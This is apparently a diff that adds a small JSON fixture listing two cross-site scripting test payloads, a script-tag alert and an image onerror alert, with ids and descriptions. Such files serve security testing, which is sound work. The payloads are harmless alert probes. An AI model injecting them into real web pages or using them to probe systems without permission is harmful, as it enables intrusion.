@@ -1,0 +1,14 @@
+{
+    "payloads": [
+        {
+            "id": "XSS_SIMPLE_001",
+            "description": "Simple alert XSS",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "id": "XSS_IMG_002",
+            "description": "Image error XSS",
+            "payload": "<img src=x onerror=alert('XSS')>"
+        }
+    ]
+}
